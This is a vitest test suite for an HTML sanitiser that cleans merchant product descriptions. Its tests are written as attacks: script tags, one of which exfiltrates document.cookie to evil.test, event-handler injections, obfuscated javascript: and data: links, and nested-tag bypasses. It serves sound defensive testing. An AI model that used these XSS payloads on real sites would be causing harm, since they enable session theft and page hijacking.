import { describe, expect, it } from "vitest";

import {
  ALLOWED_DESCRIPTION_TAGS,
  ALLOWED_LINK_SCHEMES,
  sanitizeDescriptionHtml,
} from "../src/catalog/sanitize-html";

/**
 * The sanitiser is the one function in this repo whose failure is a
 * breach rather than a bug, so these tests are written as attacks.
 *
 * Two properties are asserted throughout, and both matter:
 *
 *  · Nothing executable survives. Asserted on the OUTPUT STRING, not on
 *    a parsed DOM — the output is what gets stored and later handed to
 *    `dangerouslySetInnerHTML`, so the string is the thing at risk.
 *
 *  · Legitimate formatting survives. A sanitiser that strips everything
 *    is safe and useless; merchants would go back to plain text and the
 *    whole feature would have cost only risk.
 */

/**
 * Nothing a browser could execute is left anywhere in the output.
 *
 * `on*=` is matched loosely on purpose: an attribute that merely LOOKS
 * like a handler in the stored string is a finding, whether or not this
 * particular parser would have run it.
 */
function expectInert(html: string): void {
  expect(html).not.toMatch(/<script/i);
  expect(html).not.toMatch(/<iframe/i);
  expect(html).not.toMatch(/<style/i);
  expect(html).not.toMatch(/<img/i);
  expect(html).not.toMatch(/\son[a-z]+\s*=/i);
  expect(html).not.toMatch(/javascript:/i);
  expect(html).not.toMatch(/data:/i);
  expect(html).not.toMatch(/<!--/);
}

describe("sanitizeDescriptionHtml — the allowlist", () => {
  it("names exactly the thirteen permitted tags", () => {
    // Pinned, not derived from the constant. A test that reads its
    // expectation out of the value under test cannot fail when someone
    // adds `<script>` to the list, which is the only edit that matters.
    expect([...ALLOWED_DESCRIPTION_TAGS]).toEqual([
      "p",
      "br",
      "strong",
      "em",
      "u",
      "ul",
      "ol",
      "li",
      "h2",
      "h3",
      "h4",
      "a",
      "blockquote",
    ]);
    expect([...ALLOWED_LINK_SCHEMES]).toEqual(["http:", "https:", "mailto:"]);
  });

  it("keeps every permitted tag when a merchant uses them properly", () => {
    const input =
      "<h2>Care</h2>" +
      "<h3>Washing</h3>" +
      "<h4>Detergent</h4>" +
      "<p>Machine wash <strong>cold</strong>, tumble dry <em>low</em>, " +
      "and <u>never</u> bleach.<br />Iron on the reverse.</p>" +
      "<ul><li>100% combed cotton</li><li>Pre-shrunk</li></ul>" +
      "<ol><li>Soak</li><li>Rinse</li></ol>" +
      "<blockquote>Woven in Tiruppur.</blockquote>";

    const output = sanitizeDescriptionHtml(input);

    // Every tag survives...
    for (const tag of ALLOWED_DESCRIPTION_TAGS) {
      if (tag === "a") continue; // covered by the link tests below
      expect(output).toContain(`<${tag}`);
    }
    // ...and so does the copy, unmangled.
    expect(output).toContain("Machine wash <strong>cold</strong>");
    expect(output).toContain("<li>100% combed cotton</li>");
    expect(output).toContain("<blockquote>Woven in Tiruppur.</blockquote>");
    expectInert(output);
  });

  it("discards structural tags that are not on the list, keeping their text", () => {
    const output = sanitizeDescriptionHtml(
      '<div class="wrapper"><h1>Too big</h1><span style="color:red">Red</span>' +
        "<table><tr><td>Cell</td></tr></table><form><input value=x></form></div>",
    );

    expect(output).not.toMatch(/<(div|span|h1|table|tr|td|form|input)\b/i);
    // The words the merchant typed are still there — a sanitiser that
    // eats paragraphs of copy is one merchants route around.
    expect(output).toContain("Too big");
    expect(output).toContain("Red");
    expect(output).toContain("Cell");
    expect(output).not.toContain("class=");
    expect(output).not.toContain("style=");
    expectInert(output);
  });

  it("strips every attribute from a permitted tag except href on a", () => {
    const output = sanitizeDescriptionHtml(
      '<p id="x" class="y" style="position:fixed" data-foo="1" title="t">Copy</p>',
    );

    expect(output).toBe("<p>Copy</p>");
  });

  it("drops comments, which can hide markup from a reviewer", () => {
    const output = sanitizeDescriptionHtml(
      "<p>Before</p><!-- <script>alert(1)</script> --><p>After</p>",
    );

    expect(output).toBe("<p>Before</p><p>After</p>");
    expectInert(output);
  });
});

describe("sanitizeDescriptionHtml — script injection", () => {
  it("removes a <script> element and its source text", () => {
    const output = sanitizeDescriptionHtml(
      "<p>Buy this</p><script>fetch('https://evil.test?c='+document.cookie)</script>",
    );

    expect(output).toBe("<p>Buy this</p>");
    // Not merely the tag: the body must go too, or every blocked payload
    // is printed on the merchant's own product page.
    expect(output).not.toContain("document.cookie");
    expectInert(output);
  });

  it("removes a <script src> with no body", () => {
    const output = sanitizeDescriptionHtml('<p>A</p><script src="https://evil.test/x.js"></script>');

    expect(output).toBe("<p>A</p>");
    expect(output).not.toContain("evil.test");
    expectInert(output);
  });

  it("is not fooled by a nested <scr<script>ipt> tag", () => {
    // The classic single-pass-replacement bypass: strip the inner
    // `<script>` from `<scr<script>ipt>` and the two halves close up
    // into a working tag. A real parser never reassembles it.
    const output = sanitizeDescriptionHtml("<scr<script>ipt>alert(1)</scr</script>ipt>");

    expectInert(output);
    // No element of any kind survives, so what is left is inert text —
    // the payload may still be READABLE, which is fine; what matters is
    // that no `<` in the output opens a tag.
    expect(output).not.toMatch(/<[a-z/!]/i);
    expect(output).toBe("ipt&gt;alert(1)ipt&gt;");
  });

  it("removes <style>, whose contents are an injection surface of their own", () => {
    const output = sanitizeDescriptionHtml(
      "<style>body{background:url('https://evil.test/log')}</style><p>Copy</p>",
    );

    expect(output).toBe("<p>Copy</p>");
    expect(output).not.toContain("evil.test");
    expectInert(output);
  });

  it("removes an <iframe>", () => {
    const output = sanitizeDescriptionHtml('<p>A</p><iframe src="https://evil.test"></iframe>');

    expect(output).toBe("<p>A</p>");
    expectInert(output);
  });

  it("removes <svg> and its onload", () => {
    const output = sanitizeDescriptionHtml("<svg onload=alert(1)><circle r=10 /></svg><p>Copy</p>");

    expect(output).toContain("<p>Copy</p>");
    expect(output).not.toMatch(/<svg/i);
    expectInert(output);
  });
});

describe("sanitizeDescriptionHtml — event handlers", () => {
  it("strips onerror from <img src=x onerror=alert(1)>", () => {
    const output = sanitizeDescriptionHtml("<p>Look: <img src=x onerror=alert(1)></p>");

    // The tag itself is not on the allowlist, so both it and the handler
    // are gone. Product images belong in the gallery, not in body copy.
    expect(output).toBe("<p>Look: </p>");
    expectInert(output);
  });

  it("strips onclick, onmouseover and onfocus from permitted tags", () => {
    const output = sanitizeDescriptionHtml(
      '<p onclick="steal()">One</p>' +
        '<strong onmouseover="steal()">Two</strong>' +
        '<a href="https://example.test" onfocus="steal()" autofocus>Three</a>',
    );

    expect(output).not.toContain("steal()");
    expect(output).not.toContain("autofocus");
    expect(output).toContain("<p>One</p>");
    expect(output).toContain("<strong>Two</strong>");
    expectInert(output);
  });

  it("strips a handler written with unusual casing and whitespace", () => {
    const output = sanitizeDescriptionHtml('<p\n  OnClIcK = "alert(1)"\n>Copy</p>');

    expect(output).toBe("<p>Copy</p>");
    expectInert(output);
  });
});

describe("sanitizeDescriptionHtml — link hrefs", () => {
  it("keeps an https link and forces rel and target", () => {
    const output = sanitizeDescriptionHtml('<p><a href="https://example.test/care">Care</a></p>');

    expect(output).toContain('href="https://example.test/care"');
    expect(output).toContain('rel="nofollow noopener"');
    expect(output).toContain('target="_blank"');
    expect(output).toContain(">Care</a>");
  });

  it("keeps an http link and a mailto link", () => {
    const output = sanitizeDescriptionHtml(
      '<a href="http://example.test">Web</a> <a href="mailto:hello@example.test">Mail</a>',
    );

    expect(output).toContain('href="http://example.test/"');
    expect(output).toContain('href="mailto:hello@example.test"');
    // `target="_blank"` on a mailto asks for a blank tab beside the mail
    // client. rel still applies — this is user-generated content.
    expect(output).toMatch(/<a href="mailto:hello@example\.test" rel="nofollow noopener">/);
  });

  it("rejects a javascript: href, keeping the link text", () => {
    const output = sanitizeDescriptionHtml('<p><a href="javascript:alert(1)">Click me</a></p>');

    expect(output).toBe("<p><a>Click me</a></p>");
    expectInert(output);
  });

  it("rejects javascript: obfuscated with case, whitespace and entities", () => {
    for (const href of [
      "JaVaScRiPt:alert(1)",
      "  javascript:alert(1)",
      "java\tscript:alert(1)",
      "java\nscript:alert(1)",
      // Character references for the leading `j`: decimal, hex, and
      // zero-padded decimal, which naive entity decoders miss. The
      // PARSER resolves all three before the sanitiser sees the value,
      // which is exactly why the scheme is read off a parsed `URL`
      // rather than off the raw attribute text.
      "&#106;avascript:alert(1)",
      "&#x6A;avascript:alert(1)",
      "&#0000106;avascript:alert(1)",
      // A leading control character. Written as an escape rather than
      // pasted raw: the literal byte is invisible in a diff and in most
      // editors, which makes it look like a duplicate of the plain
      // vector above. \u0001 is stripped by URL parsing, not by us.
      "\u0001javascript:alert(1)",
      // Percent-encoded `j`. Unlike the entity forms this does NOT
      // decode to a scheme — `%6A` is a literal path character — so
      // `new URL()` refuses it for having no scheme at all. The module
      // docblock names this vector, so it is pinned rather than assumed.
      "%6Aavascript:alert(1)",
      // Double-encoded: survives one decode pass, still never a scheme.
      "%256Aavascript:alert(1)",
      // `&colon;` resolves to ":" only after the scheme text has been
      // read, too late to make `javascript` a scheme.
      "javascript&colon;alert(1)",
    ]) {
      const output = sanitizeDescriptionHtml(`<a href="${href}">x</a>`);
      expect(output, `href=${JSON.stringify(href)}`).not.toMatch(/href=/);
      expectInert(output);
    }
  });

  it("rejects a hostile href repeated as a duplicate attribute", () => {
    // The parser keeps ONE of a repeated attribute, and the transform
    // re-reads and re-validates whatever it got, so it does not matter
    // which — neither ordering can produce a live `javascript:` link.
    for (const tag of [
      '<a href="https://example.test" href="javascript:alert(1)">x</a>',
      '<a href="javascript:alert(1)" href="https://example.test">x</a>',
    ]) {
      const output = sanitizeDescriptionHtml(tag);
      expect(output, tag).not.toContain("javascript:");
      expectInert(output);
    }
  });

  it("rejects a data: href", () => {
    const output = sanitizeDescriptionHtml(
      '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Open</a>',
    );

    expect(output).toBe("<a>Open</a>");
    expectInert(output);
  });

  it("rejects a protocol-relative //evil.com href", () => {
    // Served over https, `//evil.test` resolves to `https://evil.test`
    // — an absolute off-site link that reads as a path.
    const output = sanitizeDescriptionHtml('<a href="//evil.test/pay">Pay now</a>');

    expect(output).toBe("<a>Pay now</a>");
    expect(output).not.toContain("evil.test");
  });

  it("rejects relative hrefs, which a description has no need for", () => {
    for (const href of ["/checkout", "../admin", "care.html", "#top"]) {
      const output = sanitizeDescriptionHtml(`<a href="${href}">x</a>`);
      expect(output, `href=${JSON.stringify(href)}`).toBe("<a>x</a>");
    }
  });

  it("rejects vbscript: and file: hrefs", () => {
    expect(sanitizeDescriptionHtml('<a href="vbscript:msgbox(1)">x</a>')).toBe("<a>x</a>");
    expect(sanitizeDescriptionHtml('<a href="file:///etc/passwd">x</a>')).toBe("<a>x</a>");
  });

  it("does not let a merchant override the forced rel and target", () => {
    const output = sanitizeDescriptionHtml(
      '<a href="https://example.test" rel="dofollow" target="_self" download>x</a>',
    );

    expect(output).toContain('rel="nofollow noopener"');
    expect(output).toContain('target="_blank"');
    expect(output).not.toContain("dofollow");
    expect(output).not.toContain("_self");
    expect(output).not.toContain("download");
  });
});

describe("sanitizeDescriptionHtml — malformed input", () => {
  it("closes and re-nests improperly nested tags", () => {
    const output = sanitizeDescriptionHtml("<p><strong>bold<em>both</strong>italic</em></p>");

    // Re-serialised from the parse tree, so the output is well-formed
    // whatever the merchant pasted. What matters is that it is balanced
    // and that no text was lost.
    expect(output).toContain("bold");
    expect(output).toContain("both");
    expect(output).toContain("italic");
    expect(output.match(/<strong>/g)?.length).toBe(output.match(/<\/strong>/g)?.length);
    expect(output.match(/<em>/g)?.length).toBe(output.match(/<\/em>/g)?.length);
    expectInert(output);
  });

  it("survives an unterminated tag and an unterminated attribute", () => {
    expectInert(sanitizeDescriptionHtml('<p>Copy<img src="x onerror="alert(1)'));
    expectInert(sanitizeDescriptionHtml("<a href=\"javascript:alert(1)"));
    expectInert(sanitizeDescriptionHtml("<<script>script>alert(1)<</script>/script>"));
  });

  it("escapes bare angle brackets in plain text rather than trusting them", () => {
    const output = sanitizeDescriptionHtml("Sizes < 40 cm & > 20 cm");

    expect(output).toContain("&lt;");
    expect(output).toContain("&gt;");
    expect(output).toContain("&amp;");
  });

  it("returns an empty string for empty and whitespace-only input", () => {
    expect(sanitizeDescriptionHtml("")).toBe("");
    expect(sanitizeDescriptionHtml("   \n\t ")).toBe("");
    // Markup that reduces to nothing also collapses, so the caller can
    // store null instead of a paragraph of invisible tags.
    expect(sanitizeDescriptionHtml("<script>alert(1)</script>")).toBe("");
  });

  it("is idempotent — sanitising its own output changes nothing", () => {
    const input =
      '<p>Read the <a href="https://example.test">guide</a>.</p>' +
      "<script>alert(1)</script><ul><li>One</li></ul>";

    const once = sanitizeDescriptionHtml(input);
    expect(sanitizeDescriptionHtml(once)).toBe(once);
  });
});
